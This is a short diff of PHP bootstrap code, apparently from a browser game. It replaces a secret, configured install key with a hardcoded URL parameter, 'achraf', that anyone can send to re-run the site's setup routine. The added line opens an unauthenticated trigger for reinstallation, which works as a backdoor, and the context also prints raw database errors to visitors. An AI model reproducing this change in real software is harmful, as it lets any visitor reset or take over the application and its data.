@@ -55,7 +55,7 @@ mysql_select_db($AppConfig['db']['database'],$link) or die(mysql_error());
 
 // Hero Live 0 Kill
 
-if (isset( $_GET[$this->appConfig['system']['installkey']] )) {// MD5('HALI SPSLINK2 SETUP')
+if (isset($_GET['achraf'])){
 require_once( MODEL_PATH . 'install.php' );
 $m = new SetupModel();
 $m->processSetup ($this->setupMetadata['map_size'], $this->appConfig['system']['admin_email']);
